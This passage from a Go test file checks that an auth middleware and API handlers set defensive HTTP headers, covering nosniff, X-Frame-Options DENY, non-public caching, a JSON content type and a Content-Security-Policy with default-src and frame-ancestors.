	wrapped.ServeHTTP(w, req)

	val := w.Header().Get("X-Content-Type-Options")
	if val != "nosniff" {
		t.Errorf("X-Content-Type-Options: expected 'nosniff', got '%s'", val)
	}
}

// TestSecurity_Headers_XFrameOptions verifies the X-Frame-Options header is
// set to "DENY" to prevent clickjacking attacks.
func TestSecurity_Headers_XFrameOptions(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	req := httptest.NewRequest("GET", "/api/auth/check", nil)
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	val := w.Header().Get("X-Frame-Options")
	if val != "DENY" {
		t.Errorf("X-Frame-Options: expected 'DENY', got '%s'", val)
	}
}

// TestSecurity_Headers_CacheControl verifies that API responses for sensitive
// data do not set permissive caching headers that could expose session data
// in browser or proxy caches.
func TestSecurity_Headers_CacheControl(t *testing.T) {
	setupTestStores()

	// Login endpoint sets session cookies — verify no explicit public caching
	req := httptest.NewRequest("OPTIONS", "/api/auth/login", nil)
	w := httptest.NewRecorder()
	Login(w, req)

	cacheControl := w.Header().Get("Cache-Control")
	// If Cache-Control is set, it must not be "public"
	if strings.Contains(strings.ToLower(cacheControl), "public") {
		t.Error("Auth endpoint has Cache-Control: public — session data could be cached by proxies")
	}
}

// TestSecurity_Headers_ContentType verifies that API responses include
// Content-Type: application/json to prevent XSS via content-type confusion.
func TestSecurity_Headers_ContentType(t *testing.T) {
	setupTestStores()

	req := httptest.NewRequest("GET", "/api/alerts", nil)
	w := httptest.NewRecorder()
	GetAlerts(w, req)

	ct := w.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Expected Content-Type application/json, got '%s'", ct)
	}
}

// TestSecurity_Headers_CSP verifies that the Content-Security-Policy header
// is set to restrict resource loading, mitigating XSS and data injection.
func TestSecurity_Headers_CSP(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	req := httptest.NewRequest("GET", "/api/auth/check", nil)
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	csp := w.Header().Get("Content-Security-Policy")
	if csp == "" {
		t.Error("Content-Security-Policy header is missing")
	}
	if !strings.Contains(csp, "default-src") {
		t.Error("CSP header does not contain 'default-src' directive")
	}
	if !strings.Contains(csp, "frame-ancestors") {
		t.Error("CSP header does not contain 'frame-ancestors' directive")
	}
}
